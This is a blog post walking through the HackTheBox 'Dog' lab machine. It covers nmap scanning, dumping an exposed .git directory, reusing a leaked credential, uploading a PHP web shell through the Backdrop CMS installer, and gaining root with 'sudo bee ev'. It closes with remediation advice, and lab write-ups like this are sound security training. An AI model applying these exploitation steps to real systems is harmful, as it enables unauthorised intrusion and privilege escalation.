---
layout: post  # Use your theme's default post layout, or 'page' if it's a static page
title: "HackTheBox Dog Walkthrough - Pentest Lab Notes"
date: 2025-11-23 12:00:00 -0500  # Adjust timezone if needed
categories: [hackthebox, pentest, walkthrough]
tags: [ctf, enumeration, exploit, dog, writeups, htb, ]
author: h4ck3rfirst
img: https://labs.hackthebox.com/achievement/machine/2423723/651
excerpt: "Detailed notes on exploiting the Dog machine in HackTheBox Pentest Labs."
---

# 🐶 Hack The Box | Dog - Walkthrough

This walkthrough details the steps taken to fully compromise the **Dog** machine on Hack The Box.

> ✅ Status: `Pwned`  
> 🔗 HTB Link: [https://app.hackthebox.com/machines/651](https://app.hackthebox.com/machines/651)  
> 🎯 Difficulty: Easy  
> 🧠 Skills: Web Exploitation, Enumeration, Privilege Escalation

---

### 🔎 Enumeration & Initial Access

# 🌐 Network Scanning

Initial Nmap scan to discover open ports and services:

```
nmap -sV -sC -oN nmap/initial.nmap 10.10.11.58
```
Results:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

   Port 22: OpenSSH

   Port 80: Apache with a robots.txt revealing multiple sensitive paths.

# 🌍 Web Enumeration

   Target website runs Backdrop CMS.

   A .git directory was found and dumped using:
```
git-dumper http://10.10.11.58/.git ./git-dump/
```
  After 8 hours of Enumrations Found credentials in settings.php:

    $database = 'mysql://root:BackDrop...@127.0.0.1/backdrop';

Discovered user email:
``` tiffany@dog.htb ```

# 🔐 CMS Admin Panel Access

   Tried credentials: ```tiffany:BackDropJ2024DS2024 → Success!```

   Logged into Backdrop CMS Admin Panel.

# 💥 Exploiting Backdrop CMS

Backdrop CMS v1.21.0 has a known vulnerability (Exploit-DB #52021).

    Created a malicious .tar file containing a PHP web shell.

    Uploaded it via:

http://10.10.11.58/?q=admin/installer/manual

Accessed shell at:

    http://10.10.11.58/modules/shell/shell.php

# 🐚 Gaining Shell Access

    From the shell, enumerated users via /etc/passwd.

    Found user: johncusack.

Tried SSH login:
```
ssh johncusack@10.10.11.58
```
# Password: BackDrop...


User Shell Acquired!

id
# uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)

# 🎯 User flag located at:
```
/home/johncusack/user.txt
```
🚀 Privilege Escalation
🔍 Sudo Permissions

Check with:
```
sudo -l
```
Result:

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

# 🐝 Abusing bee Utility

   bee is a CLI tool for Backdrop CMS.

   It supports an eval option that can run arbitrary PHP as root.

Exploit:
```
sudo /usr/local/bin/bee ev "system('id')"
```
Output:

uid=0(root) gid=0(root) groups=0(root)

# 🎯 Root shell acquired!
🏁 Flags
```
   ✅ user.txt: /home/johncusack/user.txt

   ✅ root.txt: /root/root.txt
```

# 🧯Remediation Recommendations

    Restrict access to .git directories.

    Remove sensitive backups or hidden directories.

    Avoid hardcoding credentials.

    Carefully review and limit sudo permissions.

    Update vulnerable CMS software.

📌 Summary
Step	Action
Initial Foothold	Backdrop CMS admin login via reused creds
Shell Access	Upload PHP shell through CMS module installer
Lateral Movement	SSH as johncusack with found creds
Privilege Escalation	Abused sudo bee to run PHP as root